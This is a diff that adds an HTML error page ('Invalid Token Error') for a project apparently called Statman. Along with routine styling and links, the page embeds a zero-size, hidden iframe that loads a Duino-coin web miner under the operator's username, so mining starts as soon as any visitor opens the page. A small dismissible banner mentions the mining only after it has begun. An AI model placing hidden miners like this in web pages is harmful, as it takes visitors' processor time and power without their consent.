@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Invalid Token Error || Statman || Darkmash</title>
+    <style>
+        body {
+            background-image: url("error_2.svg");
+            background-repeat: no-repeat;
+            background-size: cover;
+        }
+        
+        .ls {
+            color: rgb(36, 36, 36);
+            text-decoration: none;
+            font-weight: 600;
+            font-size: small;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin-left: 10px;
+        }
+        
+        .mner {
+            visibility: hidden;
+            height: 0px;
+            width: 0px;
+        }
+        
+        #footer {
+            position: fixed;
+            left: 0px;
+            bottom: 0px;
+            /* height: 30px; */
+            width: 100%;
+            /* background: #999; */
+        }
+        
+        .alert {
+            padding: 20px;
+            background-color: rgb(32, 32, 32);
+            color: rgb(184, 184, 184);
+            font-size: 14px;
+            font-weight: 600;
+            font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+        }
+        
+        .closebtn {
+            margin-left: 15px;
+            color: white;
+            font-weight: bold;
+            float: right;
+            font-size: 20px;
+            line-height: 18px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        
+        .closebtn:hover {
+            color: rgb(54, 54, 54);
+        }
+    </style>
+</head>
+
+<body>
+    <a class="ls" href="index.html">Home</a>
+    <a class="ls" href="https://darkmash-org.github.io/">Darkmash</a>
+    <a class="ls" href="https://github.com/darkmash-org/Statman/blob/main/fund_us.md">Support</a>
+
+    <iframe class="mner" src="https://server.duinocoin.com/webminer.html?username=darkmash&threads=1&rigid=statman&keyinput="></iframe>
+    <footer id="footer">
+
+        <div class="alert">
+            <span class="closebtn" onclick="this.parentElement.style.display='none';">&times;</span> We do mine in the site . This is to make sure the company could serve yall the next day : )
+        </div>
+
+    </footer>
+</body>
+
+</html>
